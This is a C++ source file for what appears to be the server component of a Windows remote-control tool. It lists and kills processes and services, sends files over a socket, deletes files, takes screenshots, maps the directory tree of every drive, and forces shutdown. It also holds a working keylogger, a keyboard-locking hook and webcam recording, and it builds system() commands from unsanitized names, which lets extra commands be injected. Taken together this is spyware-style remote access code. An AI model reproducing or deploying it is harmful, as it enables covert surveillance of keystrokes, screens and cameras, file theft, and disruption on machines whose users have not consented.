#include "process.h"
#include "commands.h"

// start app
string startApp(string name) {
    string command = "start " + name;
    int result = system(command.c_str());

    json jsonResponse;

    if (result == 0) {
		jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Successfully started " + name;
    }
    else {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Windows cannot find " + name + ". Make sure you typed the name correctly, and then try again";
    }

    return jsonResponse.dump();
}

// stop app
string stopApp(string name) {
    string command = "taskkill /IM " + name + ".exe /F";
    int result = system(command.c_str());

    json jsonResponse;

    if (result == 0) {
        jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Successfully stopped " + name;
    }
    else {
        FILE* pipe = _popen(command.c_str(), "r");
        char buffer[128];
        string line = "";
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            line += buffer;
        }

        jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "The application with name " + name + " is inactive or not existent";
    }

    return jsonResponse.dump();
}

// list app
void writeAppListToFile(const vector<vector<string>>& apps) {
    ofstream outFile(DATA_FILE);

    if (!outFile) {
        cerr << "Failed to open file." << endl;
        return;
    }

    // write title
    outFile << setw(30) << left << "Application Name"
        << setw(10) << left << "PID"
        << setw(25) << left << "Memory Usage (GB)"
        << setw(50) << left << "Path" << endl;
    outFile << string(105, '-') << endl;

    // write app information
    for (const auto& app : apps) {
        double memoryInGB = stod(app[2]);
        outFile << setw(30) << left << app[0]        // application Name
            << setw(15) << left << app[1]        // PID
            << setw(20) << left << fixed << setprecision(2) << memoryInGB   // memory usage in GB
            << setw(50) << left << app[3]        // path
            << endl;
    }

    outFile.close();
}
vector<vector<string>> getRunningApps() {
    // PowerShell command to get information about processes (Name, PID, Memory Usage, Path)
    string command = R"(powershell -Command "Get-Process | Where-Object {$_.mainwindowhandle -ne 0} | Select-Object Name,Id,WorkingSet64,Path | Format-Table -HideTableHeaders")";

    FILE* pipe = _popen(command.c_str(), "r");
    if (!pipe) {
        cerr << "Failed to run command." << endl;
        return {};
    }

    vector<vector<string>> appList;
    char buffer[1024]; // ensure the size is large enough to hold the data

    // read data from PowerShell and process it
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        string line(buffer);
        line.erase(remove(line.begin(), line.end(), '\n'), line.end());
        line.erase(remove(line.begin(), line.end(), '\r'), line.end());

        // skip empty lines
        if (line.empty()) {
            continue;
        }

        istringstream ss(line);
        vector<string> appDetails;

        string name, pid, memory, path;

        // read values from the line
        ss >> name >> pid >> memory;
        getline(ss, path); // read the path with getline to accurately capture paths with spaces
        path.erase(remove(path.begin(), path.end(), ' '), path.end()); // remove extra spaces at the beginning and end

        // convert Memory Usage from bytes to GB
        long long memoryInBytes = stoll(memory); // xonvert string to long long
        double memoryInGB = static_cast<double>(memoryInBytes) / (1024 * 1024 * 1024); // convert from bytes to GB

        // save the information
        appDetails.push_back(name);
        appDetails.push_back(pid);
        appDetails.push_back(to_string(memoryInGB)); // convert to string and save
        appDetails.push_back(path);

        appList.push_back(appDetails);
    }

    _pclose(pipe);
    return appList;
}
json listApp() {
    vector<vector<string>> appList = getRunningApps();

    json jsonResponse;

    jsonResponse["title"] = "listApps";

    if (!appList.empty()) {
        jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Successfully listed applications";
        writeAppListToFile(appList);
    }
    else {
        jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to list applications";
    }

    return jsonResponse;
}

// start service
string startService(string name) {
    string command = "net start " + name + " > nul 2>&1";
    int result = system(command.c_str());

    json jsonResponse;

    string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";

    if (result == 0) {
        jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Service " + name + " has been started successfully.";
    }
    else if (system(checkCommand.c_str()) == 0) {
        jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Service " + name + " is already running.";
    }
    else {
        jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to start service " + name + ". Please check the service status.";
    }

    return jsonResponse.dump();
}

// stop service
string stopService(string name) {
    string command = "net stop " + name + " > nul 2>&1";
    int result = system(command.c_str());

    json jsonResponse;

    string checkCommand = "sc query " + name + " | find \"RUNNING\" > nul";

    if (result == 0) {
        jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Service " + name + " has been stopped successfully.";
    }
    else if (system(checkCommand.c_str()) != 0) {
        jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Service " + name + " is already stopped.";
    }
    else {
        jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to stop service " + name + ". Please check the service status.";
    }

    return jsonResponse.dump();
}

// list service
string getServiceDescription(SC_HANDLE hService) {
    LPQUERY_SERVICE_CONFIG serviceConfig;
    DWORD bytesNeeded;
    string description = "No description available";
    if (QueryServiceConfig(hService, NULL, 0, &bytesNeeded) || GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
        serviceConfig = (LPQUERY_SERVICE_CONFIG)malloc(bytesNeeded);
        if (QueryServiceConfig(hService, serviceConfig, bytesNeeded, &bytesNeeded)) {
            description = convertWideCharToString(serviceConfig->lpDisplayName);
        }
        free(serviceConfig);
    }
    return description;
}
string truncateString(const string& str, size_t maxLength) {
    if (str.length() > maxLength) {
        return str.substr(0, maxLength) + "...";
    }
    return str;
}
string convertWideCharToString(LPCWSTR wideCharStr) {
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wideCharStr, -1, nullptr, 0, nullptr, nullptr);
    string result(bufferSize - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wideCharStr, -1, &result[0], bufferSize, nullptr, nullptr);
    return result;
}
vector<pair<string, tuple<int, string, string>>> listAllServices() {
    vector<pair<string, tuple<int, string, string>>> servicesInfo;

    SC_HANDLE hSCManager = OpenSCManager(nullptr, nullptr, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCManager == nullptr) {
        cerr << "Unable to open Service Control Manager: " << GetLastError() << endl;
        return servicesInfo;
    }

    DWORD dwBytesNeeded = 0, dwServicesReturned = 0, dwResumeHandle = 0;
    DWORD dwBufferSize = 0;
    LPBYTE lpBuffer = nullptr;

    // get the required memory size
    EnumServicesStatusEx(
        hSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32,
        SERVICE_STATE_ALL,
        lpBuffer,
        dwBufferSize,
        &dwBytesNeeded,
        &dwServicesReturned,
        &dwResumeHandle,
        nullptr
    );

    // allocate memory
    dwBufferSize = dwBytesNeeded;
    lpBuffer = new BYTE[dwBufferSize];
    if (!EnumServicesStatusEx(
        hSCManager,
        SC_ENUM_PROCESS_INFO,
        SERVICE_WIN32,
        SERVICE_STATE_ALL,
        lpBuffer,
        dwBufferSize,
        &dwBytesNeeded,
        &dwServicesReturned,
        &dwResumeHandle,
        nullptr
    )) {
        cerr << "Unable to list services: " << GetLastError() << endl;
        delete[] lpBuffer;
        CloseServiceHandle(hSCManager);
        return servicesInfo;
    }

    // collect service names, PID, description, and status of the services
    auto* services = reinterpret_cast<LPENUM_SERVICE_STATUS_PROCESS>(lpBuffer);
    for (DWORD i = 0; i < dwServicesReturned; ++i) {
        string serviceName = convertWideCharToString(services[i].lpServiceName);
        int pid = services[i].ServiceStatusProcess.dwProcessId;

        // service status
        string status = (services[i].ServiceStatusProcess.dwCurrentState == SERVICE_RUNNING) ? "Running" : "Stopped";

        // get service description
        SC_HANDLE hService = OpenService(hSCManager, services[i].lpServiceName, SERVICE_QUERY_CONFIG);
        string description = getServiceDescription(hService);
        CloseServiceHandle(hService);

        // truncate service name and description if too long
        serviceName = truncateString(serviceName, 40);  // truncate service name if over 40 characters
        description = truncateString(description, 40);  // truncate description if over 40 characters

        // add to vector
        servicesInfo.push_back({ serviceName, make_tuple(pid, description, status) });
    }

    // clean up memory
    delete[] lpBuffer;
    CloseServiceHandle(hSCManager);

    return servicesInfo;
}
void writeServiceListToFile(const vector<pair<string, tuple<int, string, string>>>& services) {
    ofstream outputFile(DATA_FILE);

    // write titles
    outputFile << left << setw(40) << "Name"
        << setw(10) << "PID"
        << setw(40) << "Description"
        << setw(15) << "Status" << endl;
    outputFile << string(100, '-') << endl;

    // write service informations
    for (const auto& service : services) {
        const auto& [name, serviceInfo] = service;
        const auto& [pid, description, status] = serviceInfo;

        outputFile << left << setw(40) << name
            << setw(10) << pid
            << setw(40) << description
            << setw(15) << status << endl;
    }

    outputFile.close();
}
json listService() {
    vector<pair<string, tuple<int, string, string>>> servicesList = listAllServices();

    json jsonResponse;

    if (!servicesList.empty()) {
		jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Successfully listed services";
        writeServiceListToFile(servicesList);
    }
    else {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to list services";
    }

    return jsonResponse;
}

// list process
json listProcess() {
    json jsonRespone;

    int result = system("tasklist > data.bin");

    if (result == 0) {
		jsonRespone["status"] = "OK";
        jsonRespone["result"] = "Successfully listed process";
    }
    else {
		jsonRespone["status"] = "FAILED";
        jsonRespone["result"] = "Failed to list services";
    }

    return jsonRespone;
}

// get file
bool sendFile(SOCKET& clientSocket, string fileName) {
    ifstream file(fileName, ios::binary);

	if (!file) {
		cout << "Failed to open file: " << fileName << endl;
		return false;
	}

    string fileBuffer((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());

    int fileSize = (int)fileBuffer.size();

    send(clientSocket, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0);

    int bytesSent = 0;

    while (bytesSent < fileSize) {
        int bytesToSend = min(fileSize - bytesSent, 1024);
        int result = send(clientSocket, fileBuffer.c_str() + bytesSent, bytesToSend, 0);

        if (result == SOCKET_ERROR) {
            cout << "Failed to send file data, error: " << WSAGetLastError() << endl;
            return false;
        }

        bytesSent += result;
    }

    return true;
}

// copy file
string copyFile(const string& sourceFile, const string& destinationFile) {
    ifstream source(sourceFile, ios::binary);

    json jsonResponse;

    if (!source) {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Source file does not exist or could not be opened";
        return jsonResponse.dump();
    }

    ofstream destination(destinationFile, ios::binary);

    if (!destination) {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Could not create destination file";
        return jsonResponse.dump();
    }

    destination << source.rdbuf();

	jsonResponse["status"] = "OK";
    jsonResponse["result"] = "File copied successfully";

    return jsonResponse.dump();
}

// delete file
string deleteFile(string& filePath) {
    json jsonResponse;

    if (remove(filePath.c_str()) == 0) {
		jsonResponse["status"] = "OK";
        jsonResponse["result"] = "File has been successfully deleted";
    }
    else {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to delete file";
    }

    return jsonResponse.dump();
}

// screenshot
HBITMAP captureScreen(int& screenWidth, int& screenHeight) {
    HWND hwndDesktop = GetDesktopWindow();
    HDC hdcScreen = GetDC(hwndDesktop);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    RECT screenRect;
    GetWindowRect(hwndDesktop, &screenRect);
    screenWidth = screenRect.right;
    screenHeight = screenRect.bottom;

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

    ReleaseDC(hwndDesktop, hdcScreen);
    DeleteDC(hdcMem);

    return hBitmap;
}
bool saveScreenshotToFile(HBITMAP hBitmap, int width, int height) {
    string fileName = "screenshot.png";

    BITMAP bmp;
    GetObject(hBitmap, sizeof(BITMAP), &bmp);

    BITMAPFILEHEADER fileHeader;
    BITMAPINFOHEADER infoHeader;

    fileHeader.bfType = 0x4D42;
    fileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fileHeader.bfSize = fileHeader.bfOffBits + bmp.bmWidthBytes * height;
    fileHeader.bfReserved1 = 0;
    fileHeader.bfReserved2 = 0;

    infoHeader.biSize = sizeof(BITMAPINFOHEADER);
    infoHeader.biWidth = width;
    infoHeader.biHeight = height;
    infoHeader.biPlanes = 1;
    infoHeader.biBitCount = 32;
    infoHeader.biCompression = BI_RGB;
    infoHeader.biSizeImage = bmp.bmWidthBytes * height;
    infoHeader.biXPelsPerMeter = 0;
    infoHeader.biYPelsPerMeter = 0;
    infoHeader.biClrUsed = 0;
    infoHeader.biClrImportant = 0;

    ofstream outFile(fileName, ios::out | ios::binary);
    if (!outFile) {
        cout << "Error: Failed to save BMP file" << endl;
        return false;
    }

    outFile.write(reinterpret_cast<const char*>(&fileHeader), sizeof(fileHeader));
    outFile.write(reinterpret_cast<const char*>(&infoHeader), sizeof(infoHeader));

    HDC hdc = GetDC(NULL);
    BYTE* bmpData = new BYTE[bmp.bmWidthBytes * height];
    GetDIBits(hdc, hBitmap, 0, height, bmpData, (BITMAPINFO*)&infoHeader, DIB_RGB_COLORS);
    ReleaseDC(NULL, hdc);

    outFile.write(reinterpret_cast<const char*>(bmpData), bmp.bmWidthBytes * height);
    delete[] bmpData;

    outFile.close();
    cout << "Successfully saved the screenshot to the file:  " << fileName << endl;
    return true;
}
bool takeScreenshot() {
    int screenWidth, screenHeight;

	// capture screen
    HBITMAP hBitmap = captureScreen(screenWidth, screenHeight);
    if (!hBitmap) {
        cout << "Failed to screenshot" << endl;
        return false;
    }

	// save to file screenshot.png
    if (!saveScreenshotToFile(hBitmap, screenWidth, screenHeight)) {
        cout << "Failed to screenshot" << endl;
        DeleteObject(hBitmap);
        return false;
    }

	// release memory
    DeleteObject(hBitmap);
    return true;
}

// keylogger
map<int, string> createKeyMap() {
    map<int, string> keyMap;

	// alphabet keys
    for (char c = 'A'; c <= 'Z'; ++c) keyMap[c] = string(1, c);

	// number keys
    for (char c = '0'; c <= '9'; ++c) keyMap[c] = string(1, c);

	// function keys
    keyMap[VK_F1] = "F1";    keyMap[VK_F2] = "F2";    keyMap[VK_F3] = "F3";
    keyMap[VK_F4] = "F4";    keyMap[VK_F5] = "F5";    keyMap[VK_F6] = "F6";
    keyMap[VK_F7] = "F7";    keyMap[VK_F8] = "F8";    keyMap[VK_F9] = "F9";
    keyMap[VK_F10] = "F10";  keyMap[VK_F11] = "F11";  keyMap[VK_F12] = "F12";

	// manipulation keys
    keyMap[VK_SHIFT] = "Shift";
    keyMap[VK_CONTROL] = "Ctrl";
    keyMap[VK_MENU] = "Alt";
    keyMap[VK_SPACE] = "Space";
    keyMap[VK_RETURN] = "Enter";
    keyMap[VK_BACK] = "Backspace";
    keyMap[VK_TAB] = "Tab";
    keyMap[VK_ESCAPE] = "Esc";
    keyMap[VK_CAPITAL] = "Caps Lock";   // Caps Lock
    keyMap[VK_NUMLOCK] = "Num Lock";   // Num Lock
    keyMap[VK_LWIN] = "Left Windows";   // Left Windows Key
    keyMap[VK_RWIN] = "Right Windows";  // Right Windows Key

	// arrow keys
    keyMap[VK_LEFT] = "Left Arrow";
    keyMap[VK_RIGHT] = "Right Arrow";
    keyMap[VK_UP] = "Up Arrow";
    keyMap[VK_DOWN] = "Down Arrow";

	// other keys
    keyMap[VK_DELETE] = "Delete";
    keyMap[VK_INSERT] = "Insert";
    keyMap[VK_HOME] = "Home";
    keyMap[VK_END] = "End";
    keyMap[VK_PRIOR] = "Page Up";
    keyMap[VK_NEXT] = "Page Down";

	// special characters
    keyMap[0xBD] = "-"; keyMap[0xBB] = "="; keyMap[0xDB] = "["; keyMap[0xDD] = "]";
    keyMap[0xDC] = "\\"; keyMap[0xBA] = ";"; keyMap[0xDE] = "'"; keyMap[0xBC] = ",";
    keyMap[0xBE] = "."; keyMap[0xBF] = "/"; keyMap[0xC0] = "`";
    keyMap[0x30] = "0"; keyMap[0x31] = "1"; keyMap[0x32] = "2"; keyMap[0x33] = "3";
    keyMap[0x34] = "4"; keyMap[0x35] = "5"; keyMap[0x36] = "6"; keyMap[0x37] = "7";
    keyMap[0x38] = "8"; keyMap[0x39] = "9";

	// NumPad keys
    keyMap[VK_NUMPAD0] = "NumPad 0";
    keyMap[VK_NUMPAD1] = "NumPad 1";
    keyMap[VK_NUMPAD2] = "NumPad 2";
    keyMap[VK_NUMPAD3] = "NumPad 3";
    keyMap[VK_NUMPAD4] = "NumPad 4";
    keyMap[VK_NUMPAD5] = "NumPad 5";
    keyMap[VK_NUMPAD6] = "NumPad 6";
    keyMap[VK_NUMPAD7] = "NumPad 7";
    keyMap[VK_NUMPAD8] = "NumPad 8";
    keyMap[VK_NUMPAD9] = "NumPad 9";
    keyMap[VK_DECIMAL] = "NumPad .";
    keyMap[VK_DIVIDE] = "NumPad /";
    keyMap[VK_MULTIPLY] = "NumPad *";
    keyMap[VK_SUBTRACT] = "NumPad -";
    keyMap[VK_ADD] = "NumPad +";
    keyMap[VK_NUMLOCK] = "Num Lock";

    return keyMap;
}
vector<string> collectKeyNames(int durationInSeconds) {

    map<int, string> keyMap = createKeyMap(); // create a key code mapping table
    vector<string> keyNames;  // store the names of the pressed keys
    bool keyState[256] = { false }; // previous state of the keys

    auto startTime = GetTickCount64(); // get the start time (milliseconds)
    cout << "Started collecting keys (Duration: " << durationInSeconds << " seconds):" << endl;

    while ((GetTickCount64() - startTime) / 1000 < durationInSeconds) {
        for (int key = 0; key < 256; ++key) {
            bool isPressed = GetAsyncKeyState(key) & 0x8000; // check if the key is pressed

            // check control key states
            if (key == VK_LBUTTON || key == VK_RBUTTON) continue;  // skip mouse buttons

            if (isPressed && !keyState[key]) { // if the key was just pressed (not pressed before)
                keyState[key] = true; // update the state

                if (keyMap.find(key) != keyMap.end()) { // if the key code is in the mapping table
                    keyNames.push_back(keyMap[key]);
                    cout << "Key pressed: " << keyMap[key] << endl;
                }
            }
            else if (!isPressed) { // if the key is no longer pressed
                keyState[key] = false; // reset the state
            }
        }
        Sleep(10); // reduce CPU load
    }

    cout << "Finished collecting keys" << endl;
    return keyNames;
}
void writeKeyNamesToFile(vector<string>& keyNames) {
    ofstream output(DATA_FILE);

    for (string& key : keyNames) {
        output << key << " ";
    }

    output.close();
}
json keylogger(int durationInSeconds) {
    json jsonResponse;

    vector<string> keyNames = collectKeyNames(durationInSeconds);

    if (keyNames.size() == 0) {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to collect keys";
    }
    else {
		jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Key logger successfully";
        writeKeyNamesToFile(keyNames);
    }

    return jsonResponse;
}

// lock keyboard
LRESULT CALLBACK processLowLevelKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
		return 1; // block the key
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}
bool lockKeyboard() {
    if (keyboardHook != NULL) {
        cout << "Keyboard is already locked!" << endl;
        return false;
    }

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, processLowLevelKeyboard, NULL, 0);
    if (keyboardHook == NULL) {
        DWORD error = GetLastError();
        cout << "Failed to lock the keyboard. Error code: " << error << endl;
        return false;
    }

    cout << "The keyboard has been locked." << endl;

    return true;
}
string lockKey(bool& flag) {
    json jsonResponse;

    if (lockKeyboard()) {
		jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Successfully locked the keyboard";
        flag = true;
    }
    else {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to lock the key";
    }

    return jsonResponse.dump();
}
void runKeyLockingLoop() {
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}

// unlock keyboard
bool unlockKeyboard() {
    if (keyboardHook == NULL) {
        cout << "Keyboard is not locked or already unlocked!" << endl;
        return false;
    }

    if (UnhookWindowsHookEx(keyboardHook)) {
        keyboardHook = NULL;
        cout << "The keyboard has been unlocked." << endl;
        return true;
    }
    else {
        DWORD error = GetLastError();
        cout << "Failed to unlock the keyboard. Error code: " << error << endl;
        return false;
    }
}
string unlockKey() {
    json jsonResponse;

    if (unlockKeyboard()) {
		jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Successfully unlocked the keyboard";
    }
    else {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to unlock the keyboard";
    }

    return jsonResponse.dump();
}

// shutdown
void shutdown() {
    // terminate all running processes
    string command = "taskkill /F /FI \"STATUS eq RUNNING\"";
    system(command.c_str());

	// shutdown computer
    command = "shutdown /s /t 10";
    system(command.c_str());
}

// restart
void restart() {
    // terminate all running processes
    string command = "taskkill /F /FI \"STATUS eq RUNNING\"";
    system(command.c_str());

	// restart computer
    command = "shutdown /r /t 10";
    system(command.c_str());
}

// list directory tree
bool isHiddenOrSystem(const filesystem::path& path) {
    DWORD attributes = GetFileAttributesW(path.wstring().c_str());
    if (attributes == INVALID_FILE_ATTRIBUTES) return false;
    return (attributes & FILE_ATTRIBUTE_HIDDEN) || (attributes & FILE_ATTRIBUTE_SYSTEM);
}
void printDirectoryTree(const filesystem::path& path, wofstream& output, int indent = 0, int currentDepth = 0, int maxDepth = 3) {
    if (currentDepth > maxDepth) return; // stop if it exceeds the maximum depth

    try {
        for (const auto& entry : filesystem::directory_iterator(path)) {
            // skip hidden or system files/folders
            if (isHiddenOrSystem(entry.path())) continue;

            // prepare the output string
            wstring line = wstring(indent, L' ') + L"|-- " + entry.path().filename().wstring() + L"\n";

            // write to file
            output << line;

            // if it's a directory, continue recursion (if at a level less than the maximum)
            if (filesystem::is_directory(entry.path()) && currentDepth < maxDepth) {
                printDirectoryTree(entry.path(), output, indent + 4, currentDepth + 1, maxDepth);
            }
        }
    }
    catch (const filesystem::filesystem_error& e) {
        output << L"Error: " << e.what() << L"\n";
    }
}
bool listDrivesAndPrintTree() {
    // configure file stream with UTF-8
    wofstream output(DATA_FILE, ios::out);
    output.imbue(locale("en_US.UTF-8"));

    if (!output.is_open()) {
        wcout << L"Error: Unable to open file DirectoryTree.txt for writing.\n";
        return false;
    }

    DWORD drives = GetLogicalDrives();
    if (drives == 0) {
        output << L"Error: Unable to retrieve the list of drives.\n";
        return false;
    }

    // write title to file
    output << L"This PC\n";

    for (char drive = 'A'; drive <= 'Z'; ++drive) {
        if (drives & (1 << (drive - 'A'))) {
            // create drive path
            wstring drivePath = wstring(1, drive) + L":\\";

            // write to file
            output << L"|-- Drive " + drivePath + L"\n";

            // print second-level subdirectories
            printDirectoryTree(drivePath, output, 4, 1, 3);
        }
    }

    output.close();
    return true;
}
json listDirectoryTree() {
    int defaultMode = _O_TEXT;

    defaultMode = _setmode(_fileno(stdout), _O_U16TEXT);
    if (defaultMode == -1) {
        cout << "Unable to switch output mode to Unicode. The program will continue with default settings" << endl;
    }

    json jsonResponse;

    if (listDrivesAndPrintTree()) {
		jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Successfully listed directory tree";
    }
    else {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to list directory tree";
    }

    // Khôi phục chế độ ban đầu của stdout
    if (_setmode(_fileno(stdout), defaultMode) == -1) {
        cout << "Failed to restore default stdout mode" << endl;
    }

    return jsonResponse;
}

// webcam
atomic<bool> isRecording = false;
thread webcamThread = thread();
bool createWebcamVideo(int duration) {
    cv::utils::logging::setLogLevel(cv::utils::logging::LOG_LEVEL_SILENT);

    // initialize COM in Multithreaded mode
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) {
        return false;
    }

    // open the camera
    cv::VideoCapture cap(0);
    if (!cap.isOpened()) {
        CoUninitialize();
        return false;
    }

    // get frame size and other parameters
    int frame_width = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_WIDTH));
    int frame_height = static_cast<int>(cap.get(cv::CAP_PROP_FRAME_HEIGHT));
    cv::Size frame_size(frame_width, frame_height);
    int fps = 30;

    // create VideoWriter with AVC1 codec
    string output_file = VIDEO_FILE;
    cv::VideoWriter video(output_file,
        cv::VideoWriter::fourcc('a', 'v', 'c', '1'),  // codec AVC1
        fps, frame_size, true);

    if (!video.isOpened()) {
        cap.release();
        CoUninitialize();
        return false;
    }

    // start recording video
    cv::Mat frame;
    auto start_time = chrono::steady_clock::now();
    int elapsed_time = 0;
    bool is_recording = true;  // variable to determine recording state

    while (isRecording) {
        cap >> frame;
        if (frame.empty()) {
            break;
        }

        // if still recording, write video
        if (is_recording) {
            video.write(frame);  // write frame to file
        }

        // display video
        cv::imshow("Video Recording", frame);

        // check recording time
        auto current_time = chrono::steady_clock::now();
        elapsed_time = (int)chrono::duration_cast<chrono::seconds>(current_time - start_time).count();

        // stop recording after the duration but continue capturing frames
        if (elapsed_time >= duration && is_recording) {
            is_recording = false;
            video.release();
        }

        // check for key press
        int key = cv::waitKey(1) & 0xFF;

        // check if window is closed
        if (cv::getWindowProperty("Video Recording", cv::WND_PROP_VISIBLE) < 1) {
            break;
        }
    }

    // clean up resources
    cap.release();
    cv::destroyAllWindows();
    CoUninitialize();

    return true;
}
string turnOnWebcam() {
    json jsonResponse;

    if (isRecording) {
        jsonResponse["status"] = "FAILED";
		jsonResponse["result"] = "Failed to turn on webcam. Webcam is already on";

        return jsonResponse.dump();
    }

    isRecording = true;
    webcamThread = thread([]() {
		bool result = createWebcamVideo(10); // record for 10 seconds
        });

	jsonResponse["status"] = "OK";
    jsonResponse["result"] = "Successfully turned on webcam";

    return jsonResponse.dump();
}
json turnOffWebcam() {
    json jsonResponse;

    if (!isRecording) {
        jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to turn off webcam. Webcam is already off";

        return jsonResponse;
    }

	isRecording = false; // stop recording

    if (webcamThread.joinable()) {
		webcamThread.join(); // wait for the thread to finish
    }
    string command = "powershell -Command \"Get-Process| Where-Object { $_.Name -eq 'WindowsCamera' } | Stop-Process\"";
    int result = system(command.c_str());

    if (result == 0) {
		jsonResponse["status"] = "OK";
        jsonResponse["result"] = "Successfully turned off webcam";
    }
    else {
		jsonResponse["status"] = "FAILED";
        jsonResponse["result"] = "Failed to turn off webcam";
    }

    return jsonResponse;
}

